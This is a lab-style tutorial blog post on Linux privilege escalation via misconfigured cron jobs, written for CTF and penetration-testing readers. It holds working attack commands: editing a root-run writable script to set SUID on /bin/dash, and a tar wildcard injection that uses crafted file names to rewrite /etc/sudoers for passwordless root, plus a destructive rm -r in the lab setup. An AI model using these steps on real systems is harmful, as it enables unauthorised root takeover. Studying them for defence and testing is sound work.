---
title: 'Linux Privilege Escalation by Exploiting Cronjobs'
date: 2019-10-21T19:53:00+01:00
draft: false
---

https://instagram.com/realvilu  
  
After solving several OSCP Challenges we decided to write the article on the various method used for Linux privilege escalation, that could be helpful for our readers in their penetration testing project. In this article, we will learn “Privilege Escalation by exploiting Cron Jobs” to gain root access of a remote host machine and also examine how a bad implement cron job can lead to Privilege escalation. If you have solved CTF challenges for Post exploit then by reading this article you will realize the several loopholes that lead to privileges escalation.  
For details, you can read our previous article where we had applied this trick for privilege escalation. Open the links given below:  
_[Link1](https://www.hackingarticles.in/hack-the-box-challenge-europa-walkthrough/): Hack the Box Challenge: Europa Walkthrough_  
_[Link2](https://www.hackingarticles.in/hack-milnet-vm-ctf-challenge/): Hack the Milnet VM (CTF Challenge)_  
**Table of content**  

*   Introduction
*   Cron job
*   Crontab syntax
*   Crontab File overwrite
*   Lab Setup (Ubuntu)
*   Exploiting cron job (Kali Linux)
*   Crontab Tar wildcard Injection
*   Lab Setup (Ubuntu)
*   Exploiting cron job (Kali Linux)

**Let’s Start!!!**  

### **What is a cron job?**

Cron Jobs are used for scheduling tasks by executing commands at specific dates and times on the server. They’re most commonly used for sysadmin jobs such as backups or cleaning /tmp/ directories and so on. The word Cron comes from crontab and it is present inside /etc directory.  
![](https://i0.wp.com/1.bp.blogspot.com/-8i_Z1KLqfpE/WykmCdfWccI/AAAAAAAAXbg/Mln8U-NCqPosOkJfQoCOnbNRKBCo1jCjQCLcBGAs/s1600/0.png?w=687)  
  
**For example:**  Inside crontab, we can add the following entry to print apache error logs automatically in every 1 hour.  

1 0 \* \* \* printf "" > /var/log/apache/error\_log

1

1  0  \*  \*  \*  printf  ""  \>  /var/log/apache/error\_log

### **Crontab File overwrite**

**Lab Setup for the Poorly configured cron job**  
**Objective:** Set a new job with help of crontab to run a python script which will erase all data from in a particular directory.  
Let assume “cleanup” is the directory whose data will be cleared automatically every two minutes. Thus we have saved some data inside /home/cleanup.  

mkdir cleanup cd cleanup echo "hello friends" > 1.txt echo "ALL files will be deleted in 2 mints" > 2.txt echo > 1.php echo > 2.php ls

1

2

3

4

5

6

7

mkdir cleanup

cd cleanup

echo  "hello friends"  \>  1.txt

echo  "ALL files will be deleted in 2 mints"  \>  2.txt

echo  \>  1.php

echo  \>  2.php

ls

As you can observe from the given image some files are stored inside the cleanup directory.  
![](https://i0.wp.com/4.bp.blogspot.com/-3i3xMgCJ3ZQ/WykmC0Z19qI/AAAAAAAAXbk/MPbaULJXFFsmFnvK1Dcf7G1X8YlA61eUQCLcBGAs/s1600/1.png?w=687)  
Now write a python program in any other directory to delete data from inside /home/cleanup and give it all permission.  

cd /tmp nano cleanup.py

1

2

cd  /tmp

nano cleanup.py

#!/usr/bin/env python import os import sys try:    os.system('rm -r /home/cleanup/\* ') except:     sys.exit()

1

2

3

4

5

6

7

#!/usr/bin/env python

import os

import sys

try:

    os.system('rm -r /home/cleanup/\* ')

except:

     sys.exit()

chmod 777 cleanup.py

1

chmod  777  cleanup.py

![](https://i2.wp.com/1.bp.blogspot.com/-rekcEfdLrso/WykmEJJMRvI/AAAAAAAAXbw/EQtEbj1dICYIaNChose8OefokJiuKOGDgCLcBGAs/s1600/2.png?w=687)  
At last schedule a task with help of crontab to run cleanup.py for every 2 minutes.  

nano /etc/crontab \*/2 \*   \* \* \*   root    /tmp/cleanup.py

1

2

nano  /etc/crontab

\*/2  \*    \*  \*  \*    root     /tmp/cleanup.py

![](https://i1.wp.com/1.bp.blogspot.com/-2drPELQIYqQ/WykmEpHnP1I/AAAAAAAAXb4/wVNcJwoScloDtdsxBZW8t98_dBvPBiT6QCLcBGAs/s1600/3.png?w=687)  
Now let’s verify our objectives  

chmod 777 cleanup.py cd /home/cleanup ls date ls date

1

2

3

4

5

6

chmod  777  cleanup.py

cd  /home/cleanup

ls

date

ls

date

Cool!! It is working, as you can see all file has been deleted after two minutes.  
![](https://i1.wp.com/3.bp.blogspot.com/-efJ83a3Zbcs/WykmE25DBZI/AAAAAAAAXb8/dw6etrJocXgoJl0k9wY0a7KBS6GZGKwCgCLcBGAs/s1600/4.png?w=687)  

### **Post Exploitation**

Start your attacking machine and first compromise the target system and then move to privilege escalation stage. Suppose I successfully login into the victim’s machine through ssh and access non-root user terminal. Execute the following command as shown below.  

cat /etc/crontab ls  -al /tmp/cleanup.py cat /tmp/cleanup.py

1

2

3

cat  /etc/crontab

ls   \-al  /tmp/cleanup.py

cat  /tmp/cleanup.py

From the above steps, we notice the crontab is running python script every two minutes now let’s exploit.  
![](https://i2.wp.com/1.bp.blogspot.com/-z-AQEhD1zYg/WykmFOiMmaI/AAAAAAAAXcA/DKQ4peEIbvIw1B84Mz3IDCFqrDF6smKBgCLcBGAs/s1600/5.png?w=687)  
There so many methods to gain root access as in this method we enabled SUID bits /bin/dash. It is quite simple, first, open the file through some editor, for example, nanocleanup.py and replace **“rm -r /tmp/\*”** from the following line as given below  

os.system('chmod u+s /bin/dash')

1

os.system('chmod u+s /bin/dash')

![](https://i0.wp.com/2.bp.blogspot.com/-FVDUH1wvGwg/WykmFxe8uvI/AAAAAAAAXcE/lPJLQOnXbywR3C-9yV-C9l-95slI5hHfwCLcBGAs/s1600/6.png?w=687)  
After two minutes it will set SUID permission for /bin/dash and when you will run it will give root access.  

/bin/dash id whoami

1

2

3

/bin/dash

id

whoami

Awesome!! We hit the Goal…………………  
![](https://i2.wp.com/4.bp.blogspot.com/-Ej0k9dtN8hw/WykmGNxgjTI/AAAAAAAAXcM/E8f-I3w0QqE21tPJsXRK1bjbO8vQAidiQCLcBGAs/s1600/7.png?w=687)  

### **Crontab Tar Wildcard Injection**

**Lab Setup**  
**Objective:** schedule a task with help of crontab to take backup with tar archival program of HTML directory.  
The directory should have executable permission whose backup you are going to take.  
![](https://i0.wp.com/3.bp.blogspot.com/-tQnHgNTy60U/WykmF85C6BI/AAAAAAAAXcI/unyCInmj6r0a253v7v5WfO1uAV6EIb4NgCLcBGAs/s1600/8.png?w=687)  
Now schedule a task with help of crontab to run tar archival program for taking backup of /html inside /var/backups in every 1 minute.  

nano /etc/crontab \*/1 \*   \* \* \*   root tar -zcf /var/backups/html.tgz /var/www/html/\*

1

2

nano  /etc/crontab

\*/1  \*    \*  \*  \*    root tar  \-zcf  /var/backups/html.tgz  /var/www/html/\*

![](https://i1.wp.com/3.bp.blogspot.com/-uwNnIZHu7qI/WykmGi348uI/AAAAAAAAXcQ/1p_dW_BSA149UGEGcVqz_Q3UxlNUpEnUACLcBGAs/s1600/9.png?w=687)  
Let’s verify the schedule is working or not by executing following command.  

cd /var/backup ls date

1

2

3

cd  /var/backup

ls

date

From given below image you can notice the html.tgz file has been generated after 1 minute.  
![](https://i2.wp.com/1.bp.blogspot.com/--v3kpRMVZys/WykmC6IDzHI/AAAAAAAAXbo/uAuRtYGDXzMt7LHNNJTKAMvpxty4aPm8QCLcBGAs/s1600/10.png?w=687)  

### **Post Exploitation**

Start your attacking machine and first compromise the target system and then move to privilege escalation stage. Suppose I successfully login into the victim’s machine through ssh and access non-root user terminal. Then open crontab to view if any job is scheduled.  

cat /etc/crontab

1

cat  /etc/crontab

Here we notice the target has scheduled a tar archival program for every 1 minute and we know that cron job runs as root. Let’s try to exploit.  
![](https://i1.wp.com/4.bp.blogspot.com/-P5oVlG8G8dg/WykmD0A0v3I/AAAAAAAAXbs/F0pzWHRCobQu8DPteV2HeQ84z3hWatMZACLcBGAs/s1600/11.png?w=687)  
Execute the following command to grant sudo right to logged user and following post exploitation is known as wildcard injection.  

echo 'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > test.sh echo "" > "--checkpoint-action=exec=sh test.sh" echo "" > --checkpoint=1 tar cf archive.tar \*

1

2

3

4

echo  'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers'  \>  test.sh

echo  ""  \>  "--checkpoint-action=exec=sh test.sh"

echo  ""  \>  \--checkpoint\=1

tar cf archive.tar \*

Now after 1 minute it will grant sudo right to the user: ignite as you can confirm this with the given below image.  

sudo -l sudo bash whoami

1

2

3

sudo  \-l

sudo bash

whoami

YUPPIEEEE!!! We have successfully obtained root access.  
  
![](https://i2.wp.com/1.bp.blogspot.com/-ShYXse_hfAw/WykmEQIjAmI/AAAAAAAAXb0/5M8dpgmp1iUt4O1aqBFT2EkPPvlgVIhGwCLcBGAs/s1600/12.png?w=687)